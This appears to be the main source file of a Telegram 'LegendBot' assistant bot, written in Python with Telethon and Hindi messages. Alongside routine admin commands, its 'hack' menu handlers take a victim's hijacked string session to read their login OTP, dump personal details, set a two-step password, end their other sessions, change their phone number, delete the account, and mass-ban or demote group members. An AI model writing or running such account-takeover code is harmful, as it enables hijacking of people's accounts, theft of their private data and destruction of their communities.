import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")

from userbot import *

from . import *
from .helpers.hack import *

mybot = "missrose_bot"

legendboy = 5122474448


from telethon import Button, custom, events

from . import legendversion
from .core.logger import logging
from .core.session import legend, tgbot

LOGS = logging.getLogger("LegendUserBot")
LEGEND_PIC = "https://telegra.ph/file/e753315316673cff51085.mp4"

onbot = "प्रारंभ - जांचें कि क्या मैं जीवित हूं \nहैक - स्ट्रिंग सत्र के माध्यम से किसी को भी हैक करें\nपिंग - पोंग!\nunban - उपयोगकर्ता आईडी/उपयोगकर्ता नाम \ntr - <lang-code> \nप्रसारण - बॉट में सभी उपयोगकर्ताओं को संदेश भेजता है \nid - की आईडी दिखाता है उपयोगकर्ता और मीडिया। \naddnote - नोट जोड़ें \nनोट्स - नोट्स दिखाता है \nस्पैम - स्पैम वैल्यू टेक्स्ट (मान < 100)\nbigspam - स्पैम वैल्यू टेक्स्ट (मान> 100) \nraid - रेड वैल्यू किसी को भी रिप्लाई करें \nरिप्लाईड - किसी को भी रिप्लाई करें \ndreplyraid - रिप्लाई करें किसी के लिए भी \nrmnote - नोट हटाएं \nlive - क्या मैं जीवित हूं? \nbun - समूह में काम करता है, एक उपयोगकर्ता को प्रतिबंधित करता है। \nunbun - समूह में एक उपयोगकर्ता को हटा दें \nprumote - एक उपयोगकर्ता को बढ़ावा देता है \ndemute - एक उपयोगकर्ता को डिमोट करता है \nपिन - एक संदेश पिन करता है \nआंकड़े - बॉट में कुल उपयोगकर्ताओं को दिखाता है \npurge - उस संदेश से इसका जवाब दें जिसे आप हटाना चाहते हैं (आपके बॉट को चाहिए इसे निष्पादित करने के लिए व्यवस्थापक बनें) \ndel - एक संदेश का उत्तर दें जिसे हटा दिया जाना चाहिए (इसे निष्पादित करने के लिए आपका बॉट व्यवस्थापक होना चाहिए)"

perf = "[ लीजेंडबोट ]"

bot = legend


async def killer():
    LEGEND_USER = bot.me.first_name
    The_LegendBoy = bot.uid
    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
    name = f"{legd_mention}'s सहायक"
    description = f"मैं {legd_mention} का सहायक हूं। यह बॉट आपको मेरे मास्टर के साथ चैट करने में मदद कर सकता है"
    starkbot = await legend.tgbot.get_me()
    bot_name = starkbot.first_name
    botname = f"@{starkbot.username}"
    if bot_name.endswith("सहायक"):
        print("बोट स्टार्टिंग")
    else:
        try:
            await bot.send_message("@BotFather", "/setinline")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", perf)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setcommands")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", onbot)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setname")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", name)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setdescription")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", description)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setuserpic")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_file("@BotFather", "userbot/resources/pics/main.jpg")
            await asyncio.sleep(2)
        except Exception as e:
            print(e)


async def legends():
    LEGEND_USER = bot.me.first_name
    The_LegendBoy = bot.uid
    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
    yescaption = f"नमस्ते सर/मिस कुछ हुआ \nडिंग डोंग टिंग टोंग पिंग पोंग\nसफलतापूर्वक लीजेंडबॉट को तैनात किया गया \nमेरे मास्टर ~ 『{legd_mention}』 \nVersion ~ {legendversion}\nमेरे बारे में अधिक जानने के लिए नीचे क्लिक करें👇🏾👇👇🏼"
    try:
        TRY = [(Button.inline("⭐ स्टार्ट ⭐", data="start"))]
        await tgbot.send_file(
            bot.me.id, LEGEND_PIC, caption=yescaption, buttons=TRY, incoming=True
        )
    except:
        pass


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    starkbot = await tgbot.get_me()
    bot_id = starkbot.first_name
    if event.query.user_id is not bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=f"अरे सर इट्स मी {bot_id}, आपकी असिस्टेंट! मैं कैसे आपकी मदद कर सकता हूँ?",
            buttons=[
                [
                    Button.url("👨‍🏫 सपोर्ट ", "https://t.me/Legend_K_Userbot"),
                    Button.url("🤖 अपडेट्स ", "https://t.me/Official_k_LegendBot"),
                ],
                [
                    custom.Button.inline("👤 यूजर्स", data="users"),
                    custom.Button.inline("⚙ सैटिंग्स", data="osg"),
                ],
                [custom.Button.inline("हैक", data="hack")],
            ],
        )
    else:
        await event.answer(
            "क्षमा करें आप इस बटन को एक्सेस नहीं कर सकते", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="आप किस प्रकार की सेटिंग चाहते हैं सर",
            buttons=[
                [
                    custom.Button.inline("♻️ पुनर्प्रारंभ करें", data="restart"),
                    custom.Button.inline("🤖 शट डाउन", data="shutdown"),
                ],
                [
                    custom.Button.inline("🗒 वार", data="strvar"),
                    custom.Button.inline("👩‍💻 कमांड्स", data="gibcmd"),
                ],
                [custom.Button.inline("✨ बैक ✨", data="start")],
            ],
        )
    else:
        await event.answer(
            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("शटडाउन लीजेंडबोट...", cache_time=0, alert=True)
        if BOTLOG:
            await event.client.send_message(BOTLOG_CHATID, "#SHUTDOWN \n" "बॉट शट डाउन")
        if HEROKU_APP is not None:
            HEROKU_APP.process_formation()["worker"].scale(0)
        else:
            os._exit(143)
    else:
        await event.answer(
            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं",
            cache_time=0,
            alert=True,
        )


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"restart")))
async def restart(event):
    if event.query.user_id == bot.uid:
        await event.answer(
            "पुनः प्रारंभ हो रहा है कृपया 4 मिनट प्रतीक्षा करें... ",
            cache_time=0,
            alert=True,
        )
        if BOTLOG:
            LEGEND = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "बॉट फिर से शुरू"
            )
        try:
            ulist = get_collectionlist_items()
            for i in ulist:
                if i == "restart_update":
                    del_keyword_collectionlist("restart_update")
        except Exception as e:
            LOGS.error(e)
        try:
            add_to_collectionlist("restart_update", [LEGEND.chat_id, LEGEND.id])
        except Exception as e:
            LOGS.error(e)
        try:
            await legend.disconnect()
        except CancelledError:
            pass
        except Exception as e:
            LOGS.error(e)
    else:
        await event.answer(
            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"strvar")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="आप किस प्रकार की सेटिंग चाहते हैं सर",
            buttons=[
                [
                    custom.Button.inline("वार एक्सप्लेन", data="var"),
                    custom.Button.inline("सभी वार", data="allvar"),
                ],
                [custom.Button.inline("पीछे", data="osg")],
            ],
        )
    else:
        await event.answer(
            "क्षमा करें केवल मेरे गुरु ही इस बटन तक पहुंच सकते हैं",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"var")))
async def users(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=".set var <varname> <value> ex:- .set var ALIVE_NAME LegendBoy \n\n सभी वार जानने के लिए वापस जाएं और सभी वार पर क्लिक करें",
            buttons=[
                [custom.Button.inline("पीछे", data="osg")],
            ],
        )
    else:
        await event.answer("सॉरी दिस बटन ओनली माई मास्टर", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"allvar")))
async def users(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=" do .setdb",
            buttons=[
                [custom.Button.inline("बैक", data="osg")],
            ],
        )
    else:
        await event.answer("सॉरी दिस बटन ओनली माई मास्टर", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gibcmd")))
async def users(event):
    if event.query.user_id == bot.uid:
        grabon = "Hello Here Are Some Commands \n➤ /start - Check if I am Alive \n➤ /ping - Pong! \n➤ /tr <lang-code> \n➤ /broadcast - Sends Message To all Users In Bot \n➤ /id - Shows ID of User And Media. \n➤ /addnote - Add Note \n➤ /notes - Shows Notes \n➤ /rmnote - Remove Note \n➤ /alive - Am I Alive? \n➤ /bun - Works In Group , Bans A User. \n➤ /unbun - Unbans A User in Group \n➤ /prumote - Promotes A User \n➤ /demute - Demotes A User \n➤ /pin - Pins A Message \n➤ /stats - Shows Total Users In Bot \n➤ /purge - Reply It From The Message u Want to Delete (Your Bot Should be Admin to Execute It) \n➤ /del - Reply a Message Tht Should Be Deleted (Your Bot Should be Admin to Execute It)"
        await tgbot.send_message(event.chat_id, grabon)
    else:
        await event.answer(
            "एक मिनट रुको, तुम मेरे मालिक नहीं हो तो इस बटन को छूने की तुम्हारी हिम्मत कैसे हुई",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
async def help(event):
    await event.delete()


menu = """
मेरे संदेश का उत्तर दें यदि मैं समूह में उपयोग कर रहा हूँ

"A" :~ [उपयोगकर्ता के अपने समूहों और चैनलों की जाँच करें]

"B" :~ [उपयोगकर्ता की सभी जानकारी जैसे फ़ोन नंबर, usrname... आदि की जाँच करें]

"C" :~ [एक समूह को प्रतिबंधित करें (मुझे स्ट्रिंग सत्र और चैनल/समूह उपयोगकर्ता नाम दें मैं वहां सभी सदस्यों को प्रतिबंधित कर दूंग।)]

"D" :~ [उपयोगकर्ता को अंतिम ओटीपी जानें {पहला उपयोग विकल्प बी फोन नंबर लें और वहां खाता लॉगिन करें फिर मेरा उपयोग करें मैं आपको ओटीपी दूंगा}]

"E" :~ [StringSession के माध्यम से एक समूह/चैनल में शामिल हों]

"F" :~ [स्ट्रिंग सत्र के माध्यम से एक समूह/चैनल छोड़ें]

"G" :~ [स्ट्रिंग सत्र के माध्यम से एक समूह/चैनल हटाएं]

"H" :~ [उपयोगकर्ता की जाँच करें दो चरण सक्षम या अक्षम हैं]

"I" :~ [अपने StringSession को छोड़कर सभी मौजूदा सक्रिय स्ट्रिंग सेशन को समाप्त करें]

"J" :~ [खाता हटा दो]

"K" :~ [एक समूह/चैनल में सभी व्यवस्थापकों को पदावनत करें]

"L" ~ [किसी सदस्य को समूह/चैनल में प्रचारित करें]

"M" ~ [StringSession का उपयोग करके फ़ोन नंबर बदलें]

I will add more features Later 😅
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
    ],
    [Button.inline("पीछे", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"hack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(
                f"चुनें कि आप स्ट्रिंग सत्र के साथ क्या चाहते हैं \n\n{menu}",
                buttons=keyboard,
            )
    else:
        await event.answer(
            "आपको इस हैक बटन को एक्सेस करने का अधिकार नहीं है", cache_time=0, alert=True
        )


@legend.tgbot.on(
    events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"चुनें कि आप स्ट्रिंग सत्र के साथ क्या चाहते हैं \n\n{menu}",
            buttons=keyboard,
        )


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("📍स्ट्रिंग सीजन दीजिए")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है।\n /hack", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.\n/hack", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nलीजेंडबॉय द्वारा विवरण")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nलीजेंडबॉय बोट का उपयोग करने के लिए धन्यवाद. \n/hack",
                buttons=keyboard,
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("🔰स्ट्रिंग सत्र दें")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(
            i + "\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.\n/hack",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply(
            "Banning all members. लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        i = await usermsgs(strses.text)
        await event.reply(
            i + "\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await x.send_message("GROUP/CHANNEL USERNAME/ID दो")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "Joined the Channel/Group. लीजेंडबोट का उपयोग करने के लिए धन्यवाद",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply(
            "Leaved the Channel/Group लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद,",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply(
            "Deleted the Channel/Group लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
                buttons=keyboard,
            )
        else:
            await event.reply(
                "क्षमा करें उपयोगकर्ता के पास पहले से ही 2 Factor लगा हुआ हैं",
                buttons=keyboard,
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await terminate(strses.text)
        await event.reply(
            "सभी सत्र समाप्त\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await delacc(strses.text)
        await event.reply(
            "The Account is deleted SUCCESSFULLLY!!\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await x.send_message("GROUP/CHANNEL USERNAME दो")
        grp = await x.get_response()
        await x.send_message("GIVE USER USERNAME दो")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "मैं आपको ग्रुप/चैनल में प्रमोट कर रहा हूँ एक मिनट रुकिए😗😗\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "मैं समूह/चैनल के सभी सदस्यों को अवनत कर रहा हूँ एक मिनट प्रतीक्षा करें 😗😗\n\nलीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है", buttons=keyboard
            )
        await x.send_message(
            "वह नंबर दें जिसे आप बदलना चाहते है\n [नोट: DON'T USE TEXTNOW OR 2NDLINE NUMBERS]\n[यदि आप TextNow या 2nd Line नंबर का उपयोग करते हैं तो आपको OTP नहीं मिलेगा] "
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n फ़ोन कोड हैश कॉपी करें और अपना नंबर जांचें जो आपको मिला है\n मैं 20 सेकंड के लिए रुकता हूं, फोन कोड हैश और ओटीपी कॉपी करता हूं"
            )
            await asyncio.sleep(20)
            await x.send_message("NOW GIVE PHONE CODE HASH")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("NOW GIVE THE OTP")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("बधाई हो नंबर बदल दी गई")
            else:
                await event.respond("कुछ गलत हो गया")
        except Exception as e:
            await event.respond(
                "इस त्रुटि को भेजें - @Legend_Userbot\n**LOGS**\n" + str(e)
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "यह स्ट्रिंग सत्र समाप्त कर दिया गया है.", buttons=keyboard
            )
        await x.send_message("API_ID")
        tola = await x.get_response()
        hmm = tola.message
        apiid = str(hmm)
        await x.send_message("API_HASH")
        hola = await x.get_response()
        nope = hola.message
        apihash = str(nope)
        await x.send_message("अब ग्रुप/चैनल दें USERNAME1")
        grp = await x.get_response()
        await x.send_message("अब उपयोगकर्ता नाम दें जिसमें आप जोड़ना चाहते हैं")
        urgrp = await x.get_response()
        try:
            i = await login(strses.text, apiid, apihash, grp.text, urgrp.text)
            await asyncio.sleep(20)
            await event.reply(
                i + "लीजेंडबॉयबोट का उपयोग करने के लिए धन्यवाद Check Member Is Adding"
            )
        except Exception as e:
            await event.respond(
                "इस त्रुटि को यहां भेजें - @Legend_Userbot\n**LOGS**\n" + str(e)
            )
